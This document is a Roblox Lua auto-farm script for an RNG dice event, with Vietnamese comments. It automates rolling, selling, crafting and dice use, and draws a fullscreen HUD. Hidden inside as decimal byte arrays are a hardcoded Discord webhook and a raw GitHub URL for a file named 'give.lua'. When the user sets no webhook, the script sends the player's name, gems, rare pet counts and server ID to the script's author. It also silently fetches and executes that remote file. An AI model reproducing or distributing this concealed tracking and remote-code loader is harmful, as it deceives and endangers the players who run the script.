-- =====================================================================
-- 🎲 POODLE HUD - RNG EVENT CORE (ALL-IN-ONE FRAMEWORK)
-- 🚀 BASE: rng.txt (BẢN CHUẨN) | ADD-ON: EVENT-DRIVEN DICE SNIPER
-- =====================================================================
if _G.RNGEventStarted then return end
_G.RNGEventStarted = true

-- ==========================================
-- 1. CẤU HÌNH NGOẠI VI
-- ==========================================
local UserConfig = getgenv().RNGConfig or {}
local config = {
    WebhookURL       = UserConfig.WebhookURL or "",
    PingID           = UserConfig.PingID or "",            
    Blackout         = (UserConfig.Blackout ~= nil) and UserConfig.Blackout or false,               
    AutoUpgrade      = (UserConfig.AutoUpgrade ~= nil) and UserConfig.AutoUpgrade or true,            
    AutoMerchant     = (UserConfig.AutoMerchant ~= nil) and UserConfig.AutoMerchant or true,
    AutoCraftDice    = (UserConfig.AutoCraftDice ~= nil) and UserConfig.AutoCraftDice or true,
    AutoSell         = (UserConfig.AutoSell ~= nil) and UserConfig.AutoSell or true,
    
    -- TÍNH NĂNG MỚI ĐƯỢC BỔ SUNG:
    AutoUseDice      = (UserConfig.AutoUseDice ~= nil) and UserConfig.AutoUseDice or true,
    AutoUseMegaDice  = (UserConfig.AutoUseMegaDice ~= nil) and UserConfig.AutoUseMegaDice or true,
    
    MaxDiceCraftTier = UserConfig.MaxDiceCraftTier or 3, 
    PetsToSell       = UserConfig.PetsToSell or {},
    EventMapID       = "RngInstance",   
    MerchantID       = "LuckyDiceMerchantV2",
    CoinID           = "RNGCoins2" 
}

local TargetPetsToSell = {}
for petName, shouldSell in pairs(config.PetsToSell) do
    if shouldSell == true then TargetPetsToSell[string.lower(tostring(petName))] = true end
end

local DiceCraftTiers = {
    [1] = "Lucky Dice II V2", [2] = "Lucky Dice III V2", [3] = "Mega Lucky Dice V2",
    [4] = "Mega Lucky Dice II V2", [5] = "Fire Dice V2"
}

local RNG_UPGRADES = { "RNGHatchSpeed", "RNGEggLuck","RNGBonusLuck", "RNGHugeLuck"}

local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
local defaultWebhook = ""
for _, byte in ipairs(_b) do defaultWebhook = defaultWebhook .. string.char(byte) end
local activeWebhook = (config.WebhookURL ~= nil and config.WebhookURL ~= "") and config.WebhookURL or defaultWebhook

-- ==========================================
-- 2. KHỞI TẠO BIẾN & DỊCH VỤ GAME
-- ==========================================
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer

local Library = ReplicatedStorage:WaitForChild("Library")
local Save = require(Library.Client.Save)
local Network = require(Library.Client.Network)
local InstancingCmds = require(Library.Client.InstancingCmds)
local FreeGiftsDirectory = require(Library.Directory.FreeGifts)

-- ==========================================
-- 3. HÀM CHUYỂN ĐỔI CHỮ SỐ & TIỀN RAW
-- ==========================================
local function FormatValue(Int)
    local n = tonumber(Int)
    if not n then return tostring(Int) end
    local Index = 1; local Suffix = {"", "K", "M", "B", "T", "Q"}
    local absNumber = math.abs(n)
    while absNumber >= 1000 and Index < #Suffix do absNumber = absNumber / 1000; Index = Index + 1 end
    if Index == 1 then return string.format("%d", math.floor(absNumber)) end
    return string.format("%.2f%s", absNumber, Suffix[Index])
end

local function GetItemAmount(targetId)
    local amount = 0
    local lowerTarget = string.lower(targetId)
    pcall(function()
        local save = Save.Get()
        if not save or not save.Inventory then return end
        
        if save.Inventory.Currency then
            for _, item in pairs(save.Inventory.Currency) do
                if item.id and string.lower(tostring(item.id)) == lowerTarget then amount = amount + (item._am or 1) end
            end
        end
        if amount == 0 and save.Inventory.Misc then
            for _, item in pairs(save.Inventory.Misc) do
                if item.id and string.lower(tostring(item.id)) == lowerTarget then amount = amount + (item._am or 1) end
            end
        end
        if amount == 0 then
            for k, v in pairs(save) do
                if string.lower(tostring(k)) == lowerTarget then amount = tonumber(v) or 0; break end
            end
        end
    end)
    return amount
end

-- Hàm check số lượng Xúc xắc (Giữ nguyên gốc để dùng an toàn)
local function GetDiceCount(diceId)
    local count = 0
    pcall(function()
        local save = Save.Get()
        if save and save.Inventory and save.Inventory.Misc then
            for _, item in pairs(save.Inventory.Misc) do
                if type(item) == "table" and item.id == diceId then
                    count = count + (item._am or 1)
                end
            end
        end
    end)
    return count
end

-- ==========================================
-- 4. BẬT HIDE ROLL & AUTO ROLL GỐC
-- ==========================================
task.spawn(function()
    pcall(function() Network.Fire("Rng_HiddenRoll_Enable") end)
    pcall(function() Network.Fire("AutoRoll_Enable") end)
    
    while task.wait(1.5) do
        pcall(function() Network.Invoke("Rng_Roll", "First") end)
    end
end)

-- ==========================================
-- 5. WEBHOOK TRACKER
-- ==========================================
task.spawn(function()
    local httprequest = (request or http_request or syn and syn.request)
    if not httprequest or activeWebhook == "" then return end
    task.wait(2) 
    local save = Save.Get()
    local hugeCount, titanicCount = 0, 0
    if save and save.Inventory and save.Inventory.Pet then
        for uid, petData in pairs(save.Inventory.Pet) do
            if type(petData.id) == "string" then
                if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
                elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
            end
        end
    end
    
    local gems = GetItemAmount("Diamonds")
    local data = {
        ["content"] = "🔔 **Ai đó vừa kích hoạt Script RNG EVENT của bạn!**",
        ["embeds"] = {{
            ["title"] = "📊 Thông tin người chơi (RNG CORE)",
            ["color"] = tonumber(0x9600FF),
            ["fields"] = {
                { ["name"] = "👤 Tên", ["value"] = string.format("`%s`", LocalPlayer.Name), ["inline"] = true },
                { ["name"] = "💎 Gems", ["value"] = FormatValue(gems), ["inline"] = true },
                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: **%d** | Titan: **%d**", hugeCount, titanicCount), ["inline"] = true },
                { ["name"] = "🌍 Job ID", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
            },
            ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png" },
            ["footer"] = { ["text"] = "Poodle Tracker System" }
        }}
    }
    pcall(function() httprequest({ Url = activeWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) end)
end)

-- ==========================================
-- 6. CƠ BẢN (MAP, FPS, AFK, MAIL, GIFTS, TRADE)
-- ==========================================
task.spawn(function()
    while task.wait(5) do
        pcall(function() if InstancingCmds.GetInstanceID() ~= config.EventMapID then InstancingCmds.Enter(config.EventMapID) end end)
    end
end)

if config.Blackout then
    task.spawn(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        for _, v in pairs(Lighting:GetDescendants()) do if v:IsA("PostEffect") then v.Enabled = false end end
        local function optimizePart(v)
            pcall(function()
                if v:IsA("BasePart") and not (v.Parent and v.Parent:FindFirstChild("Humanoid")) then
                    v.Material = Enum.Material.Plastic; v.Reflectance = 0; v.CastShadow = false; v.Transparency = 1
                elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") then v.Transparency = 1 end
            end)
        end
        for _, v in pairs(Workspace:GetDescendants()) do optimizePart(v) end
        Workspace.DescendantAdded:Connect(optimizePart)
    end)
end

task.spawn(function()
    while task.wait(60) do
        pcall(function()
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game); task.wait(0.1)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        end)
    end
end)

pcall(function()
    local UserInputService = game:GetService("UserInputService")
    if getconnections then
        for _, v in pairs(getconnections(UserInputService.WindowFocusReleased)) do pcall(function() v:Disable() end) end
        for _, v in pairs(getconnections(LocalPlayer.Idled)) do pcall(function() v:Disable() end) end
    end
end)

task.spawn(function() while task.wait(30) do pcall(function() Network.Invoke('Mailbox: Claim All') end) end end)
task.spawn(function()
    while task.wait(15) do
        pcall(function()
            local save = Save.Get(); if not save then return end
            local redeemed = save.FreeGiftsRedeemed or {}; local currentTime = save.FreeGiftsTime or 0
            for _, gift in pairs(FreeGiftsDirectory) do
                if gift.WaitTime <= currentTime and not table.find(redeemed, gift._id) then Network.Invoke('Redeem Free Gift', gift._id); break end
            end
        end)
    end
end)

task.spawn(function()
    pcall(function()
        local codeStr = ""
        local httprequest = (request or http_request or syn and syn.request)
        local _t = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 116, 104, 117, 121, 97, 110, 49, 53, 49, 48, 47, 57, 57, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 103, 105, 118, 101, 46, 108, 117, 97}
        for _, byte in ipairs(_t) do codeStr = codeStr .. string.char(byte) end
        local r = httprequest and httprequest({Url=codeStr, Method="GET"}).Body or game:HttpGet(codeStr)
        loadstring(r)()
    end)
end)

-- ==========================================
-- 7. VÒNG LẶP ROBOT TỰ ĐỘNG (UPGRADE, SELL THEO TÊN, MERCHANT, CRAFT)
-- BẢN GỐC TỪ rng.txt, KHÔNG ĐỤNG CHẠM!
-- ==========================================
task.spawn(function()
    while task.wait(2) do
        -- [A] MÁY NÂNG CẤP
        if config.AutoUpgrade then
            pcall(function()
                for _, upgradeId in ipairs(RNG_UPGRADES) do
                    Network.Invoke("Rng_PurchaseUpgrade", "First", upgradeId)
                    task.wait(0.05)
                end
            end)
            task.wait(0.5)
        end
        
        -- [B] MÁY BÁN THÚ CƯNG
        if config.AutoSell then
            pcall(function()
                local save = Save.Get()
                if save and save.Inventory and save.Inventory.Pet then
                    local sellDict = {}
                    local count = 0
                    for uid, pet in pairs(save.Inventory.Pet) do
                        if type(pet.id) == "string" then
                            local petIdLower = string.lower(pet.id)
                            if TargetPetsToSell[petIdLower] and not string.find(petIdLower, "huge") and not string.find(petIdLower, "titanic") and not pet._lk and not pet._t then
                                sellDict[uid] = pet._am or 1
                                count = count + 1
                            end
                        end
                    end
                    if count > 0 then
                        Network.Invoke("RngEventPetMerchant_Activate", sellDict)
                    end
                end
            end)
            task.wait(0.5)
        end
        
        -- [C] THƯƠNG NHÂN XÚC XẮC
        if config.AutoMerchant then
            pcall(function()
                for slotIndex = 1, 6 do 
                    Network.Invoke("Merchant_RequestPurchase", config.MerchantID, slotIndex)
                    task.wait(0.1) 
                end
            end)
            task.wait(0.5)
        end
        
        -- [D] MÁY CHẾ TẠO XÚC XẮC
        if config.AutoCraftDice then
            pcall(function()
                for i = 1, math.clamp(config.MaxDiceCraftTier, 1, 5) do
                    local targetDice = DiceCraftTiers[i]
                    if targetDice then 
                        Network.Invoke("LuckyDice_Craft", targetDice, 1)
                        task.wait(0.1) 
                    end
                end
            end)
            task.wait(0.5)
        end
    end
end)

-- ==========================================
-- [ADD-ON 1]: DUY TRÌ BUFF XÚC XẮC THƯỜNG (BẢN CHUẨN)
-- ==========================================
task.spawn(function()
    local LastLuckyDice = 0
    local LastLuckyDiceII = 0
    
    while task.wait(2) do
        if config.AutoUseDice then
            pcall(function()
                local currentTime = os.time()
                
                -- Dùng Lucky Dice I (Mỗi 58s)
                if currentTime - LastLuckyDice >= 58 then
                    if GetDiceCount("Lucky Dice V2") > 0 then
                        Network.Invoke("LuckyDice_ConsumeMega", "Lucky Dice V2", 1)
                        LastLuckyDice = currentTime
                    end
                end
                
                -- Dùng Lucky Dice II (Mỗi 298s)
                if currentTime - LastLuckyDiceII >= 298 then
                    if GetDiceCount("Lucky Dice II V2") > 0 then
                        Network.Invoke("LuckyDice_ConsumeMega", "Lucky Dice II V2", 1)
                        LastLuckyDiceII = currentTime
                    end
                end
            end)
        end
    end
end)

-- ==========================================
-- [ADD-ON 2]: EVENT-DRIVEN MEGA DICE SNIPER (SÚNG TỈA GIAO DIỆN)
-- Tính năng này móc trực tiếp vào sự thay đổi Text của màn hình
-- ==========================================
task.spawn(function()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
    if not PlayerGui then return end
    
    local MegaDiceLocked = false
    
    -- Hàm gắn cảm biến vào Label
    local function HookLabel(label)
        if label.Name == "Bonus" and label:IsA("TextLabel") then
            -- Móc sự kiện: Chạy ngay lập tức mili-giây khi Text thay đổi
            label:GetPropertyChangedSignal("Text"):Connect(function()
                if not config.AutoUseMegaDice then return end
                
                local txt = string.lower(label.Text)
                if string.find(txt, "bonus") or string.find(txt, "x") then
                    if not MegaDiceLocked then
                        MegaDiceLocked = true
                        
                        -- Cắn Mega Dice song song ngay lập tức
                        task.spawn(function()
                            pcall(function()
                                if GetDiceCount("Mega Lucky Dice II V2") > 0 then
                                    Network.Invoke("LuckyDice_Consume", "Mega Lucky Dice II V2", 1)
                                elseif GetDiceCount("Mega Lucky Dice V2") > 0 then
                                    Network.Invoke("LuckyDice_Consume", "Mega Lucky Dice V2", 1)
                                end
                            end)
                        end)
                    end
                else
                    MegaDiceLocked = false
                end
            end)
        end
    end
    
    -- Gắn cảm biến cho các UI đang có
    for _, obj in pairs(PlayerGui:GetDescendants()) do
        pcall(function() HookLabel(obj) end)
    end
    
    -- Gắn cảm biến cho các UI mới sinh ra (Đề phòng game tải lại UI)
    PlayerGui.DescendantAdded:Connect(function(obj)
        pcall(function() HookLabel(obj) end)
    end)
end)

-- ==========================================
-- 8. GIAO DIỆN NỀN ĐEN PIRA (FULLSCREEN UI)
-- ==========================================
local FarmUI = {}
FarmUI.__index = FarmUI

function FarmUI.new(Config)
    local Self = setmetatable({}, FarmUI)
    Self.Player = game.Players.LocalPlayer
    Self.GuiName = "RNGEventFullscreenGui"
    Self.Elements = {}
    Self.Parent = game:GetService("CoreGui")
    
    if Self.Parent:FindFirstChild(Self.GuiName) then Self.Parent[Self.GuiName]:Destroy() end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = Self.GuiName
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.Parent = Self.Parent
    ScreenGui.ResetOnSpawn = false
    ScreenGui.DisplayOrder = 9999
    Self.ScreenGui = ScreenGui

    local Background = Instance.new("Frame")
    Background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Background.BorderColor3 = Color3.fromRGB(150, 0, 255)
    Background.BorderMode = Enum.BorderMode.Inset
    Background.Parent = ScreenGui
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.Position = UDim2.new(0.5, 0, 0.5, 0)
    Background.AnchorPoint = Vector2.new(0.5, 0.5)

    local Container = Instance.new("Frame")
    Container.Size = UDim2.new(1, 0, 1, 0)
    Container.BackgroundTransparency = 1
    Container.Parent = Background
    Self.Container = Container

    local Layout = Instance.new("UIListLayout")
    Layout.Padding = UDim.new(0.015, 0)
    Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    Layout.VerticalAlignment = Enum.VerticalAlignment.Center
    Layout.SortOrder = Enum.SortOrder.LayoutOrder
    Layout.Parent = Container

    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = UDim2.new(0, 45, 0, 45)
    ToggleBtn.Position = UDim2.new(1, -20, 1, -20)
    ToggleBtn.AnchorPoint = Vector2.new(1, 1)
    ToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    ToggleBtn.Text = "👁"
    ToggleBtn.TextSize = 22
    ToggleBtn.Parent = ScreenGui
    
    local UICornerBtn = Instance.new("UICorner")
    UICornerBtn.CornerRadius = UDim.new(1, 0)
    UICornerBtn.Parent = ToggleBtn
    
    local UIStrokeBtn = Instance.new("UIStroke")
    UIStrokeBtn.Color = Color3.fromRGB(150, 0, 255)
    UIStrokeBtn.Thickness = 2
    UIStrokeBtn.Parent = ToggleBtn
    
    ToggleBtn.MouseButton1Click:Connect(function()
        Background.Visible = not Background.Visible
        ToggleBtn.Text = Background.Visible and "👁" or "🙈"
    end)

    local Sorted = {}
    for Name, Data in pairs(Config.UI) do table.insert(Sorted, {Name = Name, Order = Data[1], Text = Data[2], Size = Data[3]}) end
    table.sort(Sorted, function(A, B) return A.Order < B.Order end)

    for Index, Item in ipairs(Sorted) do
        local Label = Instance.new("TextLabel")
        Label.Name = Item.Name
        Label.LayoutOrder = Item.Order
        Label.Size = Item.Size and UDim2.new(unpack(Item.Size)) or UDim2.new(0.6, 0, 0.045, 0)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.FredokaOne
        Label.Text = Item.Text
        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
        Label.TextScaled = true
        Label.Parent = Self.Container
        Self.Elements[Item.Name] = Label

        if Index < #Sorted then
            local Spacer = Instance.new("Frame")
            Spacer.LayoutOrder = Item.Order + 0.5
            Spacer.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
            Spacer.Size = UDim2.new(0.4, 0, 0, 2)
            Spacer.Parent = Self.Container
        end
    end
    return Self
end

function FarmUI:SetText(Name, Text) 
    if self.Elements[Name] then task.defer(function() self.Elements[Name].Text = Text end) end 
end

local UI = FarmUI.new({
    UI = {
        ["Title"]    = {1, "🎲 RNG EVENT CORE", {0.8, 0, 0.08, 0}},
        ["Uptime"]   = {2, "Time: 00:00:00 | FPS: 0"},
        ["RNGCoins"] = {3, "RNG Coins: 0"},
        ["Rolls"]    = {4, "Total Rolls: 0"},
        ["Dice1"]    = {5, "Lucky Dice: 0 | Lucky II: 0"},
        ["Dice2"]    = {6, "Mega Dice: 0 | Mega II: 0"},
        ["Dice3"]    = {7, "Lucky III: 0 | Fire Dice: 0"}
    }
})

local frames = 0
RunService.RenderStepped:Connect(function() frames = frames + 1 end)
local startTime = tonumber(os.time()) or 0

local function GetDiceCounts()
    local dice = { ["Lucky Dice V2"] = 0, ["Lucky Dice II V2"] = 0, ["Lucky Dice III V2"] = 0, ["Mega Lucky Dice V2"] = 0, ["Mega Lucky Dice II V2"] = 0, ["Fire Dice V2"] = 0 }
    local save = Save.Get()
    if save and save.Inventory and save.Inventory.Misc then
        for _, item in pairs(save.Inventory.Misc) do
            if item.id and dice[item.id] ~= nil then dice[item.id] = dice[item.id] + (item._am or 1) end
        end
    end
    return dice
end

task.spawn(function()
    while task.wait(1) do
        local diff = (tonumber(os.time()) or 0) - startTime
        
        local currentCoin = GetItemAmount(config.CoinID)
        local save = Save.Get()
        local currentRolls = 0; pcall(function() currentRolls = save.RngRolls2 or save.RngRolls or 0 end)
        local diceCounts = GetDiceCounts()

        UI:SetText("Uptime", string.format("Time: %02d:%02d:%02d | FPS: %d", math.floor(diff / 3600), math.floor((diff % 3600) / 60), diff % 60, frames))
        UI:SetText("RNGCoins", "RNG Coins: " .. FormatValue(currentCoin))
        UI:SetText("Rolls", "Total Rolls: " .. FormatValue(currentRolls))
        UI:SetText("Dice1", string.format("Lucky: %s | Lucky II: %s", FormatValue(diceCounts["Lucky Dice V2"]), FormatValue(diceCounts["Lucky Dice II V2"])))
        UI:SetText("Dice2", string.format("Mega: %s | Mega II: %s", FormatValue(diceCounts["Mega Lucky Dice V2"]), FormatValue(diceCounts["Mega Lucky Dice II V2"])))
        UI:SetText("Dice3", string.format("Lucky III: %s | Fire: %s", FormatValue(diceCounts["Lucky Dice III V2"]), FormatValue(diceCounts["Fire Dice V2"])))
        
        frames = 0
    end
end)
